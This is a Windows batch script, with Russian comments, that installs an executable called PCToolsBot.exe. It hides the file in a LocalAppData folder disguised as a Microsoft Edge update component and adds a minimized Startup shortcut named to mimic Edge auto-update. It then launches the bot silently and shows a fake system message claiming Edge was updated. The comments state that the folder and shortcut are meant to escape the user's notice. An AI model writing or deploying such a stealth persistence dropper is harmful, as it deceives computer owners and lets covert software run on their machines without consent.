@echo off
chcp 65001 > nul
setlocal

:: ==========================================
:: НАСТРОЙКИ УСТАНОВКИ
:: ==========================================
set "FileName=PCToolsBot.exe"

:: ПУТЬ: Скрытая папка в LocalAppData. Выглядит как системный компонент Edge.
:: Не требует прав Администратора и скрыта от обычного пользователя.
set "TargetDir=%LOCALAPPDATA%\Microsoft\EdgeUpdate\Core"

:: ПУТЬ К АВТОЗАГРУЗКЕ:
set "StartupDir=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "SLinkName=MicrosoftEdgeAutoUpdate.lnk"

:: ==========================================
:: ЛОГИКА
:: ==========================================

:: 0. Проверка исходного файла
if not exist "%~dp0%FileName%" (
    echo [ОШИБКА] Файл %FileName% не найден рядом со скриптом!
    pause
    exit /b
)

:: 1. Остановка старого процесса (если бот обновляется)
echo Проверка запущенных копий...
taskkill /F /IM "%FileName%" >nul 2>&1
timeout /t 2 /nobreak >nul

:: 2. Создание скрытой директории и копирование
if not exist "%TargetDir%" mkdir "%TargetDir%"

echo Установка компонентов...
copy /Y "%~dp0%FileName%" "%TargetDir%\%FileName%" >nul

if %errorlevel% neq 0 (
    cls
    echo [ОШИБКА] Не удалось скопировать файл. Возможно, он заблокирован системой.
    pause
    exit /b
)

:: 3. Создание беспалевного ярлыка в автозагрузке (через PowerShell)
echo Настройка автозапуска...
set "SLinkFile=%StartupDir%\%SLinkName%"
set "TargetExe=%TargetDir%\%FileName%"

powershell -Command "$WshShell = New-Object -comObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut('%SLinkFile%'); $Shortcut.TargetPath = '%TargetExe%'; $Shortcut.WorkingDirectory = '%TargetDir%'; $Shortcut.WindowStyle = 7; $Shortcut.Save()"

:: 4. Тихий запуск установленного бота
echo Запуск фоновых служб...
start "" "%TargetExe%"

mshta vbscript:Execute("msgbox ""Компоненты Microsoft Edge успешно обновлены!"",0,""Системное уведомление"":close")

exit